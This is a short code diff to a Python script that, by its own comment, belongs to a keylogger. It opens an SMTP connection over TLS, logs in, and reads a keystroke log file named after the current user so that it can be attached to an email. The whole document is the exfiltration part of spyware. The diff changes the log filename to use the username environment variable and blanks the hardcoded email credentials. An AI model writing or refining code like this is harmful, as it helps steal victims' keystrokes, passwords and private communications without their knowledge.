@@ -1,10 +1,10 @@
-import smtplib, ssl
+import smtplib, ssl, os
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 # email setup
-email = "email@gmail.com"
-password = "password"
+email = ""
+password = ""
 
 # establish SMTP connection via TLS
 context = ssl.create_default_context()
@@ -13,7 +13,7 @@ server.starttls(context=context)
 server.login(email, password)
 
 # gather and prepare logfile
-filename = "username_LOG.txt" # based on keylogger.c user grabber
+filename =  os.getenv('username') + "_log.txt" # based on keylogger.c user grabber
 f = open(filename, "r")
 logfile_attachment = MIMEText(f.read())
 logfile_attachment.add_header('Content-Disposition', 'attachment', filename=filename)
